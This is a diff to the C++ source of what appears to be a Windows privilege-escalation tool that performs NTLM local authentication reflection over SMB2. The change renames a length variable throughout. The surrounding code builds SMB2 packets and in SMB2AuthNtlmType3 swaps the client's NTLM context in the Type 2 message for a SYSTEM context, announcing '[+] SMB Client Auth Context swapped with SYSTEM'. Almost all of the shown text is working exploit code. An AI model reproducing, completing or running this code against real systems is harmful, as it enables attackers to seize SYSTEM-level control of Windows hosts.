@@ -27,8 +27,8 @@ int findNTLMBytes(char* bytes, int len);
 BOOL SMBNegoProtocol(SOCKET s, char* recBuffer);
 BOOL SMB2NegoProtocol(SOCKET s, char* recBuffer);
 BOOL SMB2DoAuthentication(SOCKET s, char* recBuffer, int& MessageID);
-BOOL SMB2AuthNtlmType1(SOCKET s, char* recBuffer, int& MessageID, int* outLen, CredHandle* hCred, struct _SecHandle* hcText);
-BOOL SMB2AuthNtlmType3(SOCKET s, char* recBuffer, int& MessageID, int outLen, CredHandle* hCred, struct _SecHandle* hcText);
+BOOL SMB2AuthNtlmType1(SOCKET s, char* recBuffer, int& MessageID, int* recBufferLen, CredHandle* hCred, struct _SecHandle* hcText);
+BOOL SMB2AuthNtlmType3(SOCKET s, char* recBuffer, int& MessageID, int recBufferLen, CredHandle* hCred, struct _SecHandle* hcText);
 BOOL SMB2TreeConnect(SOCKET s, char* recBuffer, int& MessageID, wchar_t* path);
 BOOL SMB2CreateFileRequest(SOCKET s, char* recBuffer, int& MessageID, wchar_t* fname);
 BOOL SMB2WriteRequest(SOCKET s, char* recBuffer, int& MessageID, wchar_t* infile, wchar_t* fname);
@@ -223,12 +223,12 @@ BOOL SMB2NegoProtocol(SOCKET s, char* recBuffer) {
 
 BOOL SMB2DoAuthentication(SOCKET s, char* recBuffer, int& MessageID) {
     BOOL ret = TRUE;
-    int outLen = 0;
+    int recBufferLen = 0;
     CredHandle hCred;
     struct _SecHandle  hcText;
 
-    SMB2AuthNtlmType1(s, recBuffer, MessageID, &outLen, &hCred, &hcText);
-    SMB2AuthNtlmType3(s, recBuffer, MessageID, outLen, &hCred, &hcText);
+    SMB2AuthNtlmType1(s, recBuffer, MessageID, &recBufferLen, &hCred, &hcText);
+    SMB2AuthNtlmType3(s, recBuffer, MessageID, recBufferLen, &hCred, &hcText);
 
     // here we receive the return status of the SMB authentication
     unsigned int* ntlmAuthStatus = (unsigned int*)(recBuffer + 12);
@@ -243,7 +243,7 @@ BOOL SMB2DoAuthentication(SOCKET s, char* recBuffer, int& MessageID) {
     return ret;
 }
 
-BOOL SMB2AuthNtlmType1(SOCKET s, char* recBuffer, int& MessageID, int *outLen, CredHandle* hCred, struct _SecHandle* hcText) {
+BOOL SMB2AuthNtlmType1(SOCKET s, char* recBuffer, int& MessageID, int *recBufferLen, CredHandle* hCred, struct _SecHandle* hcText) {
     BOOL ret = TRUE;
     usmb2_header s2h;
     usmb2_data s2d;
@@ -311,11 +311,11 @@ BOOL SMB2AuthNtlmType1(SOCKET s, char* recBuffer, int& MessageID, int *outLen, C
     memcpy(finalPacket, netsess, 4);
     memcpy(finalPacket+4, OutBuffer, start);
     send(s, finalPacket, 4+start, 0);
-    *outLen = recv(s, recBuffer, DEFAULT_BUFLEN, 0);
+    *recBufferLen = recv(s, recBuffer, DEFAULT_BUFLEN, 0);
     return ret;
 }
 
-BOOL SMB2AuthNtlmType3(SOCKET s, char* recBuffer, int& MessageID, int outLen, CredHandle* hCred, struct _SecHandle* hcText) {
+BOOL SMB2AuthNtlmType3(SOCKET s, char* recBuffer, int& MessageID, int recBufferLen, CredHandle* hCred, struct _SecHandle* hcText) {
     BOOL ret = TRUE;
     usmb2_header s2h;
     usmb2_data s2d;
@@ -334,8 +334,8 @@ BOOL SMB2AuthNtlmType3(SOCKET s, char* recBuffer, int& MessageID, int outLen, Cr
     int pos = 0;
     char finalPacket[DEFAULT_BUFLEN];
 
-    pos = findNTLMBytes(recBuffer, outLen);
-    memcpy(&ntlmtType2[0], &recBuffer[pos], outLen - pos);
+    pos = findNTLMBytes(recBuffer, recBufferLen);
+    memcpy(&ntlmtType2[0], &recBuffer[pos], recBufferLen - pos);
     if (ntlmtType2[8] == 2)
     {
         memcpy(UserContext, &ntlmtType2[32], 8);
@@ -343,7 +343,7 @@ BOOL SMB2AuthNtlmType3(SOCKET s, char* recBuffer, int& MessageID, int outLen, Cr
         // for local auth reflection we don't really need to relay the entire packet 
         // swapping the context in the Reserved bytes with the SYSTEM context is enough
         memcpy(&ntlmtType2[32], SystemContext, 8);
-        memcpy(&recBuffer[pos], &ntlmtType2[0], outLen - pos);
+        memcpy(&recBuffer[pos], &ntlmtType2[0], recBufferLen - pos);
         printf("[+] SMB Client Auth Context swapped with SYSTEM \n");
     }
     else {
@@ -375,7 +375,7 @@ BOOL SMB2AuthNtlmType3(SOCKET s, char* recBuffer, int& MessageID, int outLen, Cr
     memcpy(&s2d.smb2_data.SecurityBufferOffset, "\x58\x00", 2);
     memcpy(&s2d.smb2_data.PreviousSessionID, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
 
-    if (!GenClientContext((BYTE*)ntlmtType2, outLen - pos, pOutBuf, &cbOut, &fDone, (SEC_WCHAR*)TargetNameSpn, hCred, hcText))
+    if (!GenClientContext((BYTE*)ntlmtType2, recBufferLen - pos, pOutBuf, &cbOut, &fDone, (SEC_WCHAR*)TargetNameSpn, hCred, hcText))
         exit(-1);
     SetEvent(event2);
     WaitForSingleObject(event3, INFINITE);
